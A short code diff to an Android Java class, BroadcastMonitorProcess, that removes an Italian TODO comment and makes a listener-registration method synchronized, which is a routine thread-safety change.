@@ -13,7 +13,6 @@ import com.android.networking.RunningProcesses;
 import com.android.networking.auto.Cfg;
 import com.android.networking.util.Check;
 
-// TODO: mettere il thread in pausa se lo schermo e' spento
 public class BroadcastMonitorProcess extends Thread {
 	/** The Constant TAG. */
 	private static final String TAG = "BroadcastMonitorProcess"; //$NON-NLS-1$
@@ -54,7 +53,7 @@ public class BroadcastMonitorProcess extends Thread {
 		} while (true);
 	}
 
-	void register(ListenerProcess listenerProcess) {
+	synchronized void register(ListenerProcess listenerProcess) {
 		stop = false;
 		this.listenerProcess = listenerProcess;
 	}
